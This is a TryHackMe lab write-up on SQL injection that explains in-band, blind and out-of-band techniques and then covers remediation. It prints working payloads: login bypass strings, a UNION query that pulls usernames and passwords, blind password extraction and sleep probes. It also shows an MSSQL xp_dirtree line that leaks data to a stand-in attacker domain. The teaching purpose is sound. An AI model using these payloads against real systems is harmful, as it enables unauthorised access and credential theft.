# TryHackMe: SQL Injection

**Room Link:** [SQL Injection](https://tryhackme.com/room/sqlinjectionlm)  
**Category:** Web Security  
**Difficulty:** Medium  

---

## Task 1: Brief

**SQL Injection (SQLi)** is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve, such as data belonging to other users, or any other data that the application itself can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

---

## Task 2: What is a Database?

A **database** is a structured collection of data.
*   **DBMS (Database Management System):** Software used to manage databases (e.g., MySQL, PostgreSQL, Microsoft SQL Server).
*   **Relational Database (RDBMS):** Stores data in tables with rows and columns. Uses SQL.
    *   Examples: MySQL, PostgreSQL, MSSQL, SQLite.
*   **Non-Relational Database (NoSQL):** Stores data in other formats (documents, key-value pairs).
    *   Examples: MongoDB, Redis.

---

## Task 3: What is SQL?

**SQL (Structured Query Language)** is the standard language for dealing with Relational Databases.

**Basic Commands:**
1.  **SELECT:** Retrieve data.
    ```sql
    SELECT * FROM users WHERE username = 'admin';
    ```
2.  **INSERT:** Add new data.
    ```sql
    INSERT INTO users (username, password) VALUES ('dimm', '12345');
    ```
3.  **UPDATE:** Modify existing data.
    ```sql
    UPDATE users SET password = 'newpass' WHERE username = 'dimm';
    ```
4.  **DELETE:** Remove data.
    ```sql
    DELETE FROM users WHERE username = 'dimm';
    ```

---

## Task 4: What is SQL Injection?

SQL Injection occurs when untrusted user input is dynamically concatenated directly into a database query without proper sanitization.

**Example Vulnerability:**
```php
$username = $_POST['username'];
$query = "SELECT * FROM users WHERE username = '" . $username . "'";
```
If input is `' OR 1=1 --`:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --'
```
*   `'`: Closes the data field.
*   `OR 1=1`: Always True condition.
*   `--`: Comments out the rest of the query.

---

## Task 5: In-Band SQLi

**In-Band SQLi** is when the attacker uses the same communication channel to analyze the results.

1.  **Error-Based SQLi:**
    *   Relies on error messages thrown by the database server to obtain information about the database structure.
    *   Example: Adding `'` causes a syntax error, revealing the backend DB type.

2.  **Union-Based SQLi:**
    *   Uses the `UNION` operator to combine the results of two or more SELECT statements into a single result set.
    *   **Requirement:** Same number of columns and compatible data types.
    *   Example: `' UNION SELECT username, password FROM users --`

---

## Task 6: Blind SQLi - Authentication Bypass

**Blind SQLi:** The application does not return the results of the SQL query directly.
**Authentication Bypass:**
*   Targeting login forms to log in without a password.
*   Payload: `' OR 1=1 --` or `admin' --` or `' OR 1=1 LIMIT 1 --`
*   Goal: Make the query return at least one row (the admin user) so the application thinks the login is successful.

---

## Task 7: Blind SQLi - Boolean Based

**Concept:**
*   The application returns a different response (page content, HTTP status code) depending on whether the query returns TRUE or FALSE.
*   We can ask Yes/No questions to the database to extract data character by character.

**Example:**
Check if the username is 'admin':
```sql
admin' AND 1=1 -- (True - Page loads normally)
admin' AND 1=0 -- (False - Page missing content/404)
```
Check first letter of password:
```sql
admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a' --
```

---

## Task 8: Blind SQLi - Time Based

**Concept:**
*   Used when the application provides NO visible difference in response (no errors, no content changes).
*   We inject a **Time Delay** (sleep) command. If the query executes successfully (TRUE), the server waits for X seconds.

**Payloads:**
*   **MySQL:** `SLEEP(5)`
*   **PostgreSQL:** `pg_sleep(5)`
*   **MSSQL:** `WAITFOR DELAY '0:0:5'`

**Example:**
If the database version starts with '5', sleep for 5 seconds:
```sql
' AND IF(SUBSTRING(VERSION(),1,1)='5', SLEEP(5), 0) --
```

---

## Task 9: Out-of-Band SQLi

**Concept:**
*   Used when In-Band and Blind techniques are not possible (e.g., async processing).
*   Relies on the database server's ability to make DNS or HTTP requests to deliver data to an attacker-controlled server.

**Example (MSSQL with `xp_dirtree`):**
Requests a file from the attacker's server, leaking data in the subdomain:
```sql
'; exec master..xp_dirtree '\\admin-password.attacker.com\foo' --
```
*   The attacker monitors DNS logs for `admin-password.attacker.com`.

---

## Task 10: Remediation

**How to Fix:**

1.  **Prepared Statements (Parameterized Queries):**
    *   The database treats user input as data, not executable code.
    *   **PHP (PDO):**
        ```php
        $stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
        $stmt->execute(['email' => $email]);
        ```

2.  **Input Validation:**
    *   Deny-list (Block dangerous chars like `'`, `--`) - **Weak**.
    *   Allow-list (Only allow a specific set of chars, e.g., alphanumeric) - **Strong**.

3.  **Principle of Least Privilege:**
    *   The database user used by the web app should only have permissions necessary for its function (e.g., SELECT/INSERT only, no DROP TABLE or FILE access).
